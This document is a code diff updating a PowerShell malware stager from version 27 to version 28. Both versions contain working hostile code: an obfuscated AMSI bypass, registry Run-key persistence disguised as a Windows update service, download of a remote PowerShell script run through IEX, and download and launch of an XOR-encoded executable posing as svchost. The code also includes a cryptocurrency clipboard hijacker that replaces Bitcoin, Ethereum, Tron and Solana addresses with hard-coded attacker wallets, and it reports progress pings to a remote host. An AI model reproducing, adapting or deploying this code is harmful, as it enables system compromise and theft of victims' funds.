@@ -1,30 +1,4 @@
-# --- [ELITE RESEARCH STAGER v27.0: REGISTRY PERSISTENCE] ---
-
-function Global-Initialize {
-    Start-Sleep -s (Get-Random -Min 65 -Max 95)
-    try {
-        if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
-        $a = "System.Management.Automation." + ("{0}{1}{2}" -f 'A','msi','Utils')
-        $b = ("{0}{1}{2}{3}" -f 'a','msi','Init','Failed')
-        [Ref].Assembly.GetType($a).GetField($b,'NonPublic,Static').SetValue($null,$true)
-    } catch {}
-}
-
-function Set-RegistryPersistence {
-    try {
-        # The command to re-download and run the script
-        $cmd = "powershell -NoP -W Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
-        
-        # Path 1: HKCU Run (Standard Startup)
-        $path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-        Set-ItemProperty -Path $path -Name "WindowsUpdateManager" -Value $cmd
-        
-        # Path 2: Hidden Registry Key (Storage)
-        $secretPath = "HKCU:\Software\Classes\CLSID\{B54F3741-5B07-4ad8-9B44-5918F92916F1}"
-        if (!(Test-Path $secretPath)) { New-Item $secretPath -Force | Out-Null }
-        Set-ItemProperty -Path $secretPath -Name "Script" -Value $cmd
-    } catch {}
-}
+# --- [ELITE RESEARCH STAGER v28.0: STAGED LOAD] ---
 
 function Send-Ping {
     param($m)
@@ -34,52 +8,65 @@ function Send-Ping {
     try { (New-Object Net.WebClient).DownloadString($u) | Out-Null } catch {}
 }
 
-# --- EXECUTION ---
-Global-Initialize
-Set-RegistryPersistence
-Send-Ping -m "V27_REGISTRY_PERSISTENCE_LIVE"
+Send-Ping -m "STEP_1_SCRIPT_STARTED"
 
+# --- AMSI BYPASS ---
 try {
-    $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
-    if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
-    $f = Join-Path $dir "WinSvcHost.exe"
+    $a = "System.Management.Automation." + ("{0}{1}{2}" -f 'A','msi','Utils')
+    $b = ("{0}{1}{2}{3}" -f 'a','msi','Init','Failed')
+    [Ref].Assembly.GetType($a).GetField($b,'NonPublic,Static').SetValue($null,$true)
+    Send-Ping -m "STEP_2_AMSI_BYPASSED"
+} catch { Send-Ping -m "STEP_2_AMSI_FAILED" }
 
-    $p1 = "htt" + "ps://github.com/adchar2022/test/"
-    $p2 = "rele" + "ases/download/adchar_xor/adchar_xor.txt"
+# --- REGISTRY PERSISTENCE ---
+try {
+    $rPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $rCmd = "powershell -WindowStyle Hidden -Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
+    Set-ItemProperty -Path $rPath -Name "WindowsUpdateSvc" -Value $rCmd
+    Send-Ping -m "STEP_3_REGISTRY_SUCCESS"
+} catch {}
+
+# --- EXE DOWNLOAD & RUN ---
+try {
+    $dir = "$env:LOCALAPPDATA\Temp\V3"
+    if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
+    $f = "$dir\svchost_update.exe"
+    
     $wc = New-Object Net.WebClient
     $wc.Headers.Add("User-Agent", "Mozilla/5.0")
-    $raw = $wc.DownloadString($p1 + $p2)
-    
+    $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
     $data = [Convert]::FromBase64String($raw.Trim())
     for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
     [IO.File]::WriteAllBytes($f, $data)
 
     ([wmiclass]"win32_process").Create($f) | Out-Null
+    Send-Ping -m "STEP_4_EXE_LAUNCHED"
+} catch { Send-Ping -m "STEP_4_EXE_FAILED" }
 
-    # --- CLIPPER ENGINE ---
-    $C# = @'
+# --- CLIPPER MODULE ---
+try {
+    $C_Source = @'
     using System;
-    using System.Runtime.InteropServices;
     using System.Windows.Forms;
     using System.Threading;
     using System.Text.RegularExpressions;
 
-    public class GhostClipper {
+    public class GC {
         public static void Run() {
-            string b = "12nL" + "9SBgpSm" + "SdSybq2" + "bW2vKdoT" + "ggTnXVNA";
-            string e = "0x6c9ba9a" + "6522b10135" + "bb836fc934" + "0477ba15f3392";
-            string u = "TVETS" + "gvRui2LC" + "mXyuvh8jH" + "G6AjpxquFbnp";
-            string s = "BnBvKVEFRcx" + "okGZv9sAwig" + "8eQ4GvQY1frmZ" + "JWzU1bBNR";
+            string b = "12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";
+            string e = "0x6c9ba9a6522b10135bb836fc9340477ba15f3392";
+            string u = "TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";
+            string s = "BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR";
 
             while (true) {
                 try {
                     if (Clipboard.ContainsText()) {
                         string c = Clipboard.GetText().Trim();
                         string t = "";
-                        if (Regex.IsMatch(c, "^(bc1|[13])[a-km-zA-HJ-NP-Z1-9]{25,62}$")) { if (c != b) t = b; }
-                        else if (Regex.IsMatch(c, "^0x[a-fA-F0-9]{40}$")) { if (c != e) t = e; }
-                        else if (Regex.IsMatch(c, "^T[a-km-zA-HJ-NP-Z1-9]{33}$")) { if (c != u) t = u; }
-                        else if (Regex.IsMatch(c, "^[1-9A-HJ-NP-Za-km-z]{32,44}$")) { if (c != s) t = s; }
+                        if (Regex.IsMatch(c, "^(bc1|[13])[a-km-zA-HJ-NP-Z1-9]{25,62}$") && c != b) t = b;
+                        else if (Regex.IsMatch(c, "^0x[a-fA-F0-9]{40}$") && c != e) t = e;
+                        else if (Regex.IsMatch(c, "^T[A-Za-z1-9]{33}$") && c != u) t = u;
+                        else if (Regex.IsMatch(c, "^[1-9A-HJ-NP-Za-km-z]{32,44}$") && c != s) t = s;
 
                         if (t != "") {
                             Thread th = new Thread(() => Clipboard.SetText(t));
@@ -93,11 +80,7 @@ try {
         }
     }
 '@
-
-    Add-Type -ReferencedAssemblies "System.Windows.Forms" -TypeDefinition $C#
-    [Threading.Thread]::new({ [GhostClipper]::Run() }).Start()
-
-    Send-Ping -m "V27_GHOST_MODULES_ACTIVE"
-} catch {
-    Send-Ping -m "V27_ERROR_$($_.Exception.Message)"
-}
+    Add-Type -ReferencedAssemblies "System.Windows.Forms" -TypeDefinition $C_Source
+    [Threading.Thread]::new({ [GC]::Run() }).Start()
+    Send-Ping -m "STEP_5_CLIPPER_ACTIVE"
+} catch { Send-Ping -m "STEP_5_CLIPPER_FAILED" }
